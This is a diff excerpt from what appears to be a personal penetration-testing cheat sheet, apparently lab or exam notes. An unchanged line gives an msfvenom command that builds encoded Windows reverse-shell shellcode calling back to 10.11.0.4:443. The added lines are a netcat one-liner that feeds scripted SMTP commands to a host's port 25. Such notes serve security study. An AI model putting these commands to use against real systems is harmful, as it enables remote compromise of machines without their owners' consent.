@@ -149,3 +149,8 @@ win remote
 generate shellcode, filtering out bad characters
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
+
+### smtp > netcat
+
+`cat "smtp" |while read L; do sleep "1"; echo "$L"; done | "nc" -C -v "192.168.243.55" "25"`
+
